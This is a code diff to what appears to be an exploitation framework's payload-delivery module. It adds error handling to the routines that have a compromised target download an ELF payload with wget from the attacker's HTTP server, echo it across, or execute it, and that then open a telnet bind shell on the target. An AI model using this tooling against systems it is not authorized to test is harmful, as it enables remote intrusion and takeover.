@@ -105,11 +105,14 @@ def shell(exploit, architecture="", method="", payloads=None, **params):
                 if method == "wget":
                     elf_binary = payload.generate_elf(data)
                     communication = Communication(exploit, elf_binary, options, **params)
-                    communication.wget()
+                    if communication.wget() is False:
+                        continue
+
                 elif method == "echo":
                     elf_binary = payload.generate_elf(data)
                     communication = Communication(exploit, elf_binary, options, **params)
                     communication.echo()
+
                 elif method == "generic":
                     params['exec_binary'] = data
                     communication = Communication(exploit, "", options, **params)
@@ -204,7 +207,7 @@ class Communication(object):
 
         if self.port_used:
             print_error("Could not set up HTTP Server on {}:{}".format(self.options['lhost'], self.options['lport']))
-            return
+            return False
 
         # wget binary
         print_status("Using wget to download binary")
@@ -216,6 +219,7 @@ class Communication(object):
                                                    self.binary_name)
 
         self.exploit.execute(cmd)
+        return True
 
     def echo(self):
         print_status("Using echo method")
@@ -337,8 +341,12 @@ class Communication(object):
         print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
         time.sleep(2)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((self.options['rhost'], int(self.options['rport'])))
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.options['rhost'], int(self.options['rport'])))
+        except socket.error:
+            print_error("Could not connect to {}:{}".format(self.options['rhost'], self.options['rport']))
+            return
 
         print_success("Enjoy your shell")
         tn = telnetlib.Telnet()
